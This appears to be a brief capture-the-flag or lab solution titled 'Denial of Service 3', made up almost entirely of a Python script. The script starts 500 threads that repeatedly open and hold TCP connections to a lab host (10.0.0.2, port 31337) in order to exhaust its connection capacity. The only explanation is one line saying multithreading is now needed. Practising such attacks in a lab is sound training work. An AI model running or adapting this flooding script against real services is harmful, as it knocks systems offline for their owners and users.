# Denial of Service 3

#### Have to use multithreading now:
```python
import socket
import time
import threading

def crash():
    while True:
        try:
            s = socket.create_connection(("10.0.0.2", 31337), timeout=1)
            time.sleep(1)
            s.close()
        except Exception:
            pass
        time.sleep(.01)

for _ in range(500):
    threading.Thread(target=crash, daemon=True).start()

while True:
    time.sleep(2)
```
